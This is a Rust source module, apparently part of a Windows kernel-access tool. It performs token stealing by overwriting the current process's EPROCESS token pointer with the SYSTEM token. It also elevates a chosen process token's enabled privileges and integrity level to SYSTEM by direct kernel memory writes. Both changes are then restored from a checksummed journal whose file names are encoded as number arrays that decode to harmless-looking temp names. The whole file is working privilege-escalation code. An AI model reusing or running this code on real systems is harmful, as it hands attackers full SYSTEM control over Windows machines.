//! Bounded token swap and token privilege/integrity control.

use crate::{
    adapter::{Capabilities, Capability, KernelAdapter},
    bytes::{is_kernel_pointer, read_u32, read_u64, write_u32, write_u64, zero},
    output::Output,
    platform::current_process_id,
    process::{ProcessRecord, ProcessSelector, find_process, read_process_record},
    profiles::{KernelField, KernelProfile},
    recovery::{RecoveryError, RecoveryStore, checksum},
    session::KernelSession,
    token::{TokenState, integrity_rid_address, read_state},
};
use core::fmt::Write;

const SYSTEM_PID: u32 = 4;
const SYSTEM_INTEGRITY_RID: u32 = 0x4000;
const LOW_INTEGRITY_RID: u32 = 0x1000;
const MAX_PROCESS_WALK: usize = 4096;
const SWAP_JOURNAL_BYTES: usize = 88;
const ADJUST_JOURNAL_BYTES: usize = 96;
const SWAP_MAGIC: u32 = 0x5354_524b;
const ADJUST_MAGIC: u32 = 0x4154_524b;
const JOURNAL_VERSION: u32 = 1;
const SWAP_NONCE: u64 = 0x3153_5452_4e52_4b00;
const ADJUST_NONCE: u64 = 0x3141_5452_4e52_4b00;
const SWAP_RECOVERY: &[u16] = &[99, 97, 99, 104, 101, 51, 54, 70, 48, 46, 116, 109, 112, 0];
const ADJUST_RECOVERY: &[u16] = &[99, 97, 99, 104, 101, 67, 57, 49, 56, 46, 116, 109, 112, 0];

#[derive(Clone, Copy, Debug, Eq, PartialEq)]
pub enum SystemTokenAction {
    Cycle,
    Restore,
}

#[derive(Clone, Copy, Debug, Eq, PartialEq)]
pub enum AdjustTokenAction {
    Cycle(ProcessSelector),
    Restore(ProcessSelector),
}

#[derive(Clone, Copy, Debug, Eq, PartialEq)]
struct SwapJournal {
    target_pid: u32,
    kernel_timestamp: u32,
    kernel_checksum: u32,
    kernel_image_size: u32,
    token_offset: u32,
    section_base: u64,
    original_fast_ref: u64,
    changed_fast_ref: u64,
    original_token_id: u64,
    changed_token_id: u64,
}

#[derive(Clone, Copy, Debug, Eq, PartialEq)]
struct AdjustJournal {
    target_pid: u32,
    kernel_timestamp: u32,
    kernel_checksum: u32,
    kernel_image_size: u32,
    section_base: u64,
    token_id: u64,
    original_privileges: u64,
    changed_privileges: u64,
    original_integrity: u32,
    changed_integrity: u32,
}

#[derive(Clone, Copy, Debug, Eq, PartialEq)]
struct TokenControlError {
    stage: &'static str,
    code: u32,
    rollback: bool,
    recovery_retained: bool,
}

pub fn run_system<A: KernelAdapter>(
    adapter: &mut A,
    action: SystemTokenAction,
    output: &mut Output,
) {
    let result = match action {
        SystemTokenAction::Cycle => system_cycle(adapter, output),
        SystemTokenAction::Restore => system_restore(adapter, output),
    };

    match result {
        Ok(()) => output.line(match action {
            SystemTokenAction::Cycle => {
                "[+] Self-token SYSTEM cycle complete; original token restored"
            }
            SystemTokenAction::Restore => {
                "[+] Self-token recovery complete; original token restored"
            }
        }),
        Err(error) => print_error(output, "Self-token", error),
    }
}

pub fn run_adjust<A: KernelAdapter>(
    adapter: &mut A,
    action: AdjustTokenAction,
    output: &mut Output,
) {
    let result = match action {
        AdjustTokenAction::Cycle(selector) => adjust_cycle(adapter, selector, output),
        AdjustTokenAction::Restore(selector) => adjust_restore(adapter, selector, output),
    };

    match result {
        Ok(()) => output.line(match action {
            AdjustTokenAction::Cycle(_) => {
                "[+] Token privilege/integrity cycle complete; original state restored"
            }
            AdjustTokenAction::Restore(_) => {
                "[+] Token privilege/integrity recovery complete; original state restored"
            }
        }),
        Err(error) => print_error(output, "Token adjustment", error),
    }
}

fn system_cycle<A: KernelAdapter>(
    adapter: &mut A,
    output: &mut Output,
) -> Result<(), TokenControlError> {
    const REQUIRED: Capabilities =
        Capabilities::from_bits(Capability::KernelRead as u32 | Capability::KernelWrite as u32);

    output.line("[*] Cycling the current process to the SYSTEM token");
    let mut session = KernelSession::open(adapter, REQUIRED, 8).map_err(session_error)?;
    let profile = session.kernel.profile;
    let system_eprocess = session.system_process;
    let (system_process, _) = find_process(
        session.adapter(),
        profile,
        system_eprocess,
        Some(SYSTEM_PID),
    )
    .map_err(process_error)?;
    let (target, walked) = find_process(
        session.adapter(),
        profile,
        system_eprocess,
        Some(current_process_id()),
    )
    .map_err(process_error)?;
    let system_token = read_state(
        session.adapter(),
        profile,
        system_process.token_fast_ref & !15,
    )
    .map_err(token_error)?;
    let original_token =
        read_state(session.adapter(), profile, target.token_fast_ref & !15).map_err(token_error)?;

    if system_token.token_type != 1
        || original_token.token_type != 1
        || system_token.integrity_rid < SYSTEM_INTEGRITY_RID
        || system_process.token_fast_ref & !15 == target.token_fast_ref & !15
    {
        return Err(control_error("system-token-precheck", 13));
    }

    let changed_fast_ref = (system_process.token_fast_ref & !15) | (target.token_fast_ref & 15);
    let journal = SwapJournal::new(
        profile,
        &target,
        changed_fast_ref,
        original_token.token_id,
        system_token.token_id,
    );
    let mut record = journal.encode();
    RecoveryStore::write_new(SWAP_RECOVERY, &record)
        .map_err(|error| recovery_error(error, false, false))?;
    let address = target
        .eprocess
        .checked_add(profile.value(KernelField::EprocessToken) as u64)
        .ok_or_else(|| control_error("token-field-address", 487))?;
    let write_result = session
        .adapter()
        .write_kernel(address, &changed_fast_ref.to_le_bytes());
    let changed = read_process_record(session.adapter(), profile, target.eprocess);
    let changed_state = changed.as_ref().ok().and_then(|process| {
        read_state(session.adapter(), profile, process.token_fast_ref & !15).ok()
    });
    let changed_valid = write_result.is_ok()
        && changed.as_ref().is_ok_and(|process| {
            process.pid == target.pid && process.token_fast_ref == changed_fast_ref
        })
        && changed_state.is_some_and(|state| {
            state.token_id == system_token.token_id && state.integrity_rid >= SYSTEM_INTEGRITY_RID
        });

    if !changed_valid {
        let rollback = restore_swap(session.adapter(), profile, &target, journal);

        if rollback {
            let _ = RecoveryStore::delete(SWAP_RECOVERY);
        }

        zero(&mut record);
        return Err(TokenControlError {
            stage: "system-token-readback",
            code: write_result.err().map(|error| error.code()).unwrap_or(13),
            rollback,
            recovery_retained: !rollback,
        });
    }

    let _ = writeln!(
        output,
        "[*] Current process : pid={} image={} walked={}",
        target.pid,
        target.display_name(),
        walked
    );
    let _ = writeln!(
        output,
        "[*] Changed token   : integrity=SYSTEM enabled-privileges={}",
        system_token.privileges_enabled.count_ones()
    );

    if !restore_swap(session.adapter(), profile, &target, journal) {
        zero(&mut record);
        return Err(TokenControlError {
            stage: "system-token-restore",
            code: 13,
            rollback: false,
            recovery_retained: true,
        });
    }

    RecoveryStore::delete(SWAP_RECOVERY).map_err(|error| recovery_error(error, true, true))?;
    zero(&mut record);
    session.close().map_err(|error| TokenControlError {
        stage: "adapter-close",
        code: error.code(),
        rollback: true,
        recovery_retained: false,
    })?;
    output.line("[*] Original token restored with exact pointer and token-ID readback");

    Ok(())
}

fn system_restore<A: KernelAdapter>(
    adapter: &mut A,
    output: &mut Output,
) -> Result<(), TokenControlError> {
    let mut record = [0_u8; SWAP_JOURNAL_BYTES];
    RecoveryStore::read_exact(SWAP_RECOVERY, &mut record)
        .map_err(|error| recovery_error(error, false, true))?;
    let journal = SwapJournal::decode(&record)
        .ok_or_else(|| retained_error("system-token-recovery-integrity", 13))?;
    zero(&mut record);
    const REQUIRED: Capabilities =
        Capabilities::from_bits(Capability::KernelRead as u32 | Capability::KernelWrite as u32);
    let mut session = KernelSession::open(adapter, REQUIRED, 8).map_err(session_error)?;
    let profile = session.kernel.profile;

    if !journal.matches_profile(profile) {
        return Err(retained_error("system-token-recovery-profile", 13));
    }

    let system_process = session.system_process;
    let (target, _) = find_process(
        session.adapter(),
        profile,
        system_process,
        Some(journal.target_pid),
    )
    .map_err(process_error)?;

    if target.section_base != journal.section_base {
        return Err(retained_error("system-token-recovery-target", 13));
    }

    if target.token_fast_ref == journal.changed_fast_ref {
        if !restore_swap(session.adapter(), profile, &target, journal) {
            return Err(retained_error("system-token-restore-readback", 13));
        }
    } else if target.token_fast_ref != journal.original_fast_ref {
        return Err(retained_error("system-token-unexpected-live-state", 13));
    }

    RecoveryStore::delete(SWAP_RECOVERY).map_err(|error| recovery_error(error, true, true))?;
    session.close().map_err(|error| TokenControlError {
        stage: "adapter-close",
        code: error.code(),
        rollback: true,
        recovery_retained: false,
    })?;
    output.line("[*] Original token pointer and token ID were verified");

    Ok(())
}

fn adjust_cycle<A: KernelAdapter>(
    adapter: &mut A,
    selector: ProcessSelector,
    output: &mut Output,
) -> Result<(), TokenControlError> {
    const REQUIRED: Capabilities =
        Capabilities::from_bits(Capability::KernelRead as u32 | Capability::KernelWrite as u32);

    output.line("[*] Cycling one process token to SYSTEM integrity and all present privileges");
    let mut session = KernelSession::open(adapter, REQUIRED, 8).map_err(session_error)?;
    let profile = session.kernel.profile;
    let system_process = session.system_process;
    let target_pid = selector_pid(selector);
    let (target, walked) = find_process(session.adapter(), profile, system_process, target_pid)
        .map_err(process_error)?;
    let token = target.token_fast_ref & !15;
    let original = read_state(session.adapter(), profile, token).map_err(token_error)?;
    let references = token_reference_count(session.adapter(), profile, system_process, token)?;
    let integrity_address =
        integrity_rid_address(session.adapter(), profile, token).map_err(token_error)?;

    if original.token_type != 1
        || original.integrity_rid < LOW_INTEGRITY_RID
        || original.integrity_rid >= SYSTEM_INTEGRITY_RID
        || original.privileges_present == 0
        || original.privileges_enabled & !original.privileges_present != 0
        || references != 1
    {
        return Err(control_error("token-adjust-precheck", 13));
    }

    let journal = AdjustJournal::new(profile, &target, &original);
    let mut record = journal.encode();
    RecoveryStore::write_new(ADJUST_RECOVERY, &record)
        .map_err(|error| recovery_error(error, false, false))?;
    let changed = write_adjusted_state(
        session.adapter(),
        profile,
        token,
        integrity_address,
        journal.changed_privileges,
        journal.changed_integrity,
    );
    let readback = read_state(session.adapter(), profile, token);

    if changed.is_err()
        || !readback.as_ref().is_ok_and(|state| {
            exact_adjusted_state(state, journal.changed_privileges, journal.changed_integrity)
                && state.token_id == journal.token_id
        })
    {
        let rollback = restore_adjustment(
            session.adapter(),
            profile,
            token,
            integrity_address,
            journal,
        );

        if rollback {
            let _ = RecoveryStore::delete(ADJUST_RECOVERY);
        }

        zero(&mut record);
        return Err(TokenControlError {
            stage: "token-adjust-readback",
            code: changed.err().map(|error| error.code()).unwrap_or(13),
            rollback,
            recovery_retained: !rollback,
        });
    }

    let _ = writeln!(
        output,
        "[*] Target          : pid={} image={} walked={} unique-token=yes",
        target.pid,
        target.display_name(),
        walked
    );
    let _ = writeln!(
        output,
        "[*] Changed state   : integrity=SYSTEM privileges={}/{}",
        journal.changed_privileges.count_ones(),
        original.privileges_present.count_ones()
    );

    if !restore_adjustment(
        session.adapter(),
        profile,
        token,
        integrity_address,
        journal,
    ) {
        zero(&mut record);
        return Err(TokenControlError {
            stage: "token-adjust-restore",
            code: 13,
            rollback: false,
            recovery_retained: true,
        });
    }

    RecoveryStore::delete(ADJUST_RECOVERY).map_err(|error| recovery_error(error, true, true))?;
    zero(&mut record);
    session.close().map_err(|error| TokenControlError {
        stage: "adapter-close",
        code: error.code(),
        rollback: true,
        recovery_retained: false,
    })?;
    output.line("[*] Original privileges and integrity RID restored exactly");

    Ok(())
}

fn adjust_restore<A: KernelAdapter>(
    adapter: &mut A,
    selector: ProcessSelector,
    output: &mut Output,
) -> Result<(), TokenControlError> {
    let mut record = [0_u8; ADJUST_JOURNAL_BYTES];
    RecoveryStore::read_exact(ADJUST_RECOVERY, &mut record)
        .map_err(|error| recovery_error(error, false, true))?;
    let journal = AdjustJournal::decode(&record)
        .ok_or_else(|| retained_error("token-adjust-recovery-integrity", 13))?;
    zero(&mut record);
    const REQUIRED: Capabilities =
        Capabilities::from_bits(Capability::KernelRead as u32 | Capability::KernelWrite as u32);
    let mut session = KernelSession::open(adapter, REQUIRED, 8).map_err(session_error)?;
    let profile = session.kernel.profile;

    if !journal.matches_profile(profile) || selector_pid(selector) != Some(journal.target_pid) {
        return Err(retained_error("token-adjust-recovery-profile", 13));
    }

    let system_process = session.system_process;
    let (target, _) = find_process(
        session.adapter(),
        profile,
        system_process,
        Some(journal.target_pid),
    )
    .map_err(process_error)?;
    let token = target.token_fast_ref & !15;
    let current = read_state(session.adapter(), profile, token).map_err(token_error)?;

    if target.section_base != journal.section_base || current.token_id != journal.token_id {
        return Err(retained_error("token-adjust-recovery-target", 13));
    }

    if token_reference_count(session.adapter(), profile, system_process, token)? != 1 {
        return Err(retained_error("token-adjust-shared-token", 170));
    }

    let integrity_address =
        integrity_rid_address(session.adapter(), profile, token).map_err(token_error)?;
    let original = exact_adjusted_state(
        &current,
        journal.original_privileges,
        journal.original_integrity,
    );
    let partial_or_changed = matches!(
        current.privileges_enabled,
        value if value == journal.original_privileges || value == journal.changed_privileges
    ) && matches!(
        current.integrity_rid,
        value if value == journal.original_integrity || value == journal.changed_integrity
    );

    if !original
        && (!partial_or_changed
            || !restore_adjustment(
                session.adapter(),
                profile,
                token,
                integrity_address,
                journal,
            ))
    {
        return Err(retained_error("token-adjust-restore-readback", 13));
    }

    RecoveryStore::delete(ADJUST_RECOVERY).map_err(|error| recovery_error(error, true, true))?;
    session.close().map_err(|error| TokenControlError {
        stage: "adapter-close",
        code: error.code(),
        rollback: true,
        recovery_retained: false,
    })?;
    output.line("[*] Original token privileges and integrity RID were verified");

    Ok(())
}

fn token_reference_count<A: KernelAdapter>(
    adapter: &mut A,
    profile: &KernelProfile,
    system_process: u64,
    token: u64,
) -> Result<usize, TokenControlError> {
    let mut current = system_process;
    let mut references = 0;

    for _ in 0..MAX_PROCESS_WALK {
        let process = read_process_record(adapter, profile, current).map_err(process_error)?;

        if process.token_fast_ref & !15 == token {
            references += 1;
        }

        let next = process
            .forward_link
            .checked_sub(profile.value(KernelField::EprocessLinks) as u64)
            .filter(|address| is_kernel_pointer(*address))
            .ok_or_else(|| control_error("token-reference-list", 13))?;

        if next == system_process {
            return Ok(references);
        }

        current = next;
    }

    Err(control_error("token-reference-bound", 13))
}

fn write_adjusted_state<A: KernelAdapter>(
    adapter: &mut A,
    profile: &KernelProfile,
    token: u64,
    integrity_address: u64,
    privileges: u64,
    integrity: u32,
) -> Result<(), crate::adapter::AdapterError> {
    let privileges_address = token + profile.value(KernelField::TokenPrivilegesEnabled) as u64;
    adapter.write_kernel(privileges_address, &privileges.to_le_bytes())?;
    adapter.write_kernel(integrity_address, &integrity.to_le_bytes())
}

fn restore_swap<A: KernelAdapter>(
    adapter: &mut A,
    profile: &KernelProfile,
    target: &ProcessRecord,
    journal: SwapJournal,
) -> bool {
    let address = target.eprocess + profile.value(KernelField::EprocessToken) as u64;

    for _ in 0..3 {
        if adapter
            .write_kernel(address, &journal.original_fast_ref.to_le_bytes())
            .is_ok()
            && read_process_record(adapter, profile, target.eprocess).is_ok_and(|process| {
                process.pid == journal.target_pid as u64
                    && process.section_base == journal.section_base
                    && process.token_fast_ref == journal.original_fast_ref
                    && read_state(adapter, profile, process.token_fast_ref & !15)
                        .is_ok_and(|state| state.token_id == journal.original_token_id)
            })
        {
            return true;
        }
    }

    false
}

fn restore_adjustment<A: KernelAdapter>(
    adapter: &mut A,
    profile: &KernelProfile,
    token: u64,
    integrity_address: u64,
    journal: AdjustJournal,
) -> bool {
    for _ in 0..3 {
        if write_adjusted_state(
            adapter,
            profile,
            token,
            integrity_address,
            journal.original_privileges,
            journal.original_integrity,
        )
        .is_ok()
            && read_state(adapter, profile, token).is_ok_and(|state| {
                state.token_id == journal.token_id
                    && exact_adjusted_state(
                        &state,
                        journal.original_privileges,
                        journal.original_integrity,
                    )
            })
        {
            return true;
        }
    }

    false
}

fn exact_adjusted_state(state: &TokenState, privileges: u64, integrity: u32) -> bool {
    state.token_type == 1
        && state.privileges_enabled == privileges
        && state.integrity_rid == integrity
}

fn selector_pid(selector: ProcessSelector) -> Option<u32> {
    match selector {
        ProcessSelector::AuthenticationService => None,
        ProcessSelector::Current => Some(current_process_id()),
        ProcessSelector::Pid(pid) => Some(pid),
    }
}

impl SwapJournal {
    fn new(
        profile: &KernelProfile,
        target: &ProcessRecord,
        changed_fast_ref: u64,
        original_token_id: u64,
        changed_token_id: u64,
    ) -> Self {
        Self {
            target_pid: target.pid as u32,
            kernel_timestamp: profile.value(KernelField::PeTimestamp),
            kernel_checksum: profile.value(KernelField::PeChecksum),
            kernel_image_size: profile.value(KernelField::ImageSize),
            token_offset: profile.value(KernelField::EprocessToken),
            section_base: target.section_base,
            original_fast_ref: target.token_fast_ref,
            changed_fast_ref,
            original_token_id,
            changed_token_id,
        }
    }

    fn encode(self) -> [u8; SWAP_JOURNAL_BYTES] {
        let mut output = [0_u8; SWAP_JOURNAL_BYTES];
        write_u32(&mut output, 0, SWAP_MAGIC);
        write_u32(&mut output, 4, JOURNAL_VERSION);
        write_u32(&mut output, 8, SWAP_JOURNAL_BYTES as u32);
        write_u32(&mut output, 12, self.target_pid);
        write_u32(&mut output, 16, self.kernel_timestamp);
        write_u32(&mut output, 20, self.kernel_checksum);
        write_u32(&mut output, 24, self.kernel_image_size);
        write_u32(&mut output, 28, self.token_offset);
        write_u64(&mut output, 32, self.section_base);
        write_u64(&mut output, 40, self.original_fast_ref);
        write_u64(&mut output, 48, self.changed_fast_ref);
        write_u64(&mut output, 56, self.original_token_id);
        write_u64(&mut output, 64, self.changed_token_id);
        write_u64(&mut output, 72, SWAP_NONCE);
        let integrity = checksum(&output[..80]);
        write_u64(&mut output, 80, integrity);

        output
    }

    fn decode(input: &[u8; SWAP_JOURNAL_BYTES]) -> Option<Self> {
        if read_u32(input, 0)? != SWAP_MAGIC
            || read_u32(input, 4)? != JOURNAL_VERSION
            || read_u32(input, 8)? != SWAP_JOURNAL_BYTES as u32
            || read_u64(input, 72)? != SWAP_NONCE
            || read_u64(input, 80)? != checksum(&input[..80])
        {
            return None;
        }

        let journal = Self {
            target_pid: read_u32(input, 12)?,
            kernel_timestamp: read_u32(input, 16)?,
            kernel_checksum: read_u32(input, 20)?,
            kernel_image_size: read_u32(input, 24)?,
            token_offset: read_u32(input, 28)?,
            section_base: read_u64(input, 32)?,
            original_fast_ref: read_u64(input, 40)?,
            changed_fast_ref: read_u64(input, 48)?,
            original_token_id: read_u64(input, 56)?,
            changed_token_id: read_u64(input, 64)?,
        };

        if journal.target_pid <= SYSTEM_PID
            || !is_kernel_pointer(journal.original_fast_ref & !15)
            || !is_kernel_pointer(journal.changed_fast_ref & !15)
            || journal.original_fast_ref & !15 == journal.changed_fast_ref & !15
            || journal.original_token_id == 0
            || journal.changed_token_id == 0
        {
            return None;
        }

        Some(journal)
    }

    fn matches_profile(self, profile: &KernelProfile) -> bool {
        self.kernel_timestamp == profile.value(KernelField::PeTimestamp)
            && self.kernel_checksum == profile.value(KernelField::PeChecksum)
            && self.kernel_image_size == profile.value(KernelField::ImageSize)
            && self.token_offset == profile.value(KernelField::EprocessToken)
    }
}

impl AdjustJournal {
    fn new(profile: &KernelProfile, target: &ProcessRecord, token: &TokenState) -> Self {
        Self {
            target_pid: target.pid as u32,
            kernel_timestamp: profile.value(KernelField::PeTimestamp),
            kernel_checksum: profile.value(KernelField::PeChecksum),
            kernel_image_size: profile.value(KernelField::ImageSize),
            section_base: target.section_base,
            token_id: token.token_id,
            original_privileges: token.privileges_enabled,
            changed_privileges: token.privileges_present,
            original_integrity: token.integrity_rid,
            changed_integrity: SYSTEM_INTEGRITY_RID,
        }
    }

    fn encode(self) -> [u8; ADJUST_JOURNAL_BYTES] {
        let mut output = [0_u8; ADJUST_JOURNAL_BYTES];
        write_u32(&mut output, 0, ADJUST_MAGIC);
        write_u32(&mut output, 4, JOURNAL_VERSION);
        write_u32(&mut output, 8, ADJUST_JOURNAL_BYTES as u32);
        write_u32(&mut output, 12, self.target_pid);
        write_u32(&mut output, 16, self.kernel_timestamp);
        write_u32(&mut output, 20, self.kernel_checksum);
        write_u32(&mut output, 24, self.kernel_image_size);
        write_u64(&mut output, 32, self.section_base);
        write_u64(&mut output, 40, self.token_id);
        write_u64(&mut output, 48, self.original_privileges);
        write_u64(&mut output, 56, self.changed_privileges);
        write_u32(&mut output, 64, self.original_integrity);
        write_u32(&mut output, 68, self.changed_integrity);
        write_u64(&mut output, 80, ADJUST_NONCE);
        let integrity = checksum(&output[..88]);
        write_u64(&mut output, 88, integrity);

        output
    }

    fn decode(input: &[u8; ADJUST_JOURNAL_BYTES]) -> Option<Self> {
        if read_u32(input, 0)? != ADJUST_MAGIC
            || read_u32(input, 4)? != JOURNAL_VERSION
            || read_u32(input, 8)? != ADJUST_JOURNAL_BYTES as u32
            || read_u64(input, 80)? != ADJUST_NONCE
            || read_u64(input, 88)? != checksum(&input[..88])
        {
            return None;
        }

        let journal = Self {
            target_pid: read_u32(input, 12)?,
            kernel_timestamp: read_u32(input, 16)?,
            kernel_checksum: read_u32(input, 20)?,
            kernel_image_size: read_u32(input, 24)?,
            section_base: read_u64(input, 32)?,
            token_id: read_u64(input, 40)?,
            original_privileges: read_u64(input, 48)?,
            changed_privileges: read_u64(input, 56)?,
            original_integrity: read_u32(input, 64)?,
            changed_integrity: read_u32(input, 68)?,
        };

        if journal.target_pid <= SYSTEM_PID
            || journal.token_id == 0
            || journal.original_integrity < LOW_INTEGRITY_RID
            || journal.original_integrity >= SYSTEM_INTEGRITY_RID
            || journal.changed_integrity != SYSTEM_INTEGRITY_RID
        {
            return None;
        }

        Some(journal)
    }

    fn matches_profile(self, profile: &KernelProfile) -> bool {
        self.kernel_timestamp == profile.value(KernelField::PeTimestamp)
            && self.kernel_checksum == profile.value(KernelField::PeChecksum)
            && self.kernel_image_size == profile.value(KernelField::ImageSize)
    }
}

fn print_error(output: &mut Output, name: &str, error: TokenControlError) {
    let _ = writeln!(
        output,
        "[-] {} action failed at {} (0x{:08x}); rollback={}; recovery-retained={}",
        name,
        error.stage,
        error.code,
        yes_no(error.rollback),
        yes_no(error.recovery_retained)
    );
}

const fn control_error(stage: &'static str, code: u32) -> TokenControlError {
    TokenControlError {
        stage,
        code,
        rollback: false,
        recovery_retained: false,
    }
}

const fn retained_error(stage: &'static str, code: u32) -> TokenControlError {
    TokenControlError {
        stage,
        code,
        rollback: false,
        recovery_retained: true,
    }
}

const fn session_error(error: crate::session::SessionError) -> TokenControlError {
    TokenControlError {
        stage: error.stage,
        code: error.code,
        rollback: false,
        recovery_retained: false,
    }
}

const fn process_error(error: crate::process::ProcessError) -> TokenControlError {
    control_error(error.stage(), error.code())
}

const fn token_error(error: crate::token::TokenError) -> TokenControlError {
    control_error(error.stage(), error.code())
}

const fn recovery_error(
    error: RecoveryError,
    rollback: bool,
    recovery_retained: bool,
) -> TokenControlError {
    TokenControlError {
        stage: error.stage(),
        code: error.code(),
        rollback,
        recovery_retained,
    }
}

const fn yes_no(value: bool) -> &'static str {
    if value { "yes" } else { "no" }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn swap_journal_round_trip_is_exact() {
        let journal = SwapJournal {
            target_pid: 100,
            kernel_timestamp: 1,
            kernel_checksum: 2,
            kernel_image_size: 3,
            token_offset: 4,
            section_base: 5,
            original_fast_ref: 0xffff_8000_0000_1003,
            changed_fast_ref: 0xffff_8000_0000_2003,
            original_token_id: 6,
            changed_token_id: 7,
        };

        assert_eq!(SwapJournal::decode(&journal.encode()), Some(journal));
    }

    #[test]
    fn adjust_journal_rejects_tampering() {
        let mut record = AdjustJournal {
            target_pid: 100,
            kernel_timestamp: 1,
            kernel_checksum: 2,
            kernel_image_size: 3,
            section_base: 4,
            token_id: 5,
            original_privileges: 6,
            changed_privileges: 7,
            original_integrity: 0x3000,
            changed_integrity: SYSTEM_INTEGRITY_RID,
        }
        .encode();
        record[48] ^= 1;

        assert_eq!(AdjustJournal::decode(&record), None);
    }
}
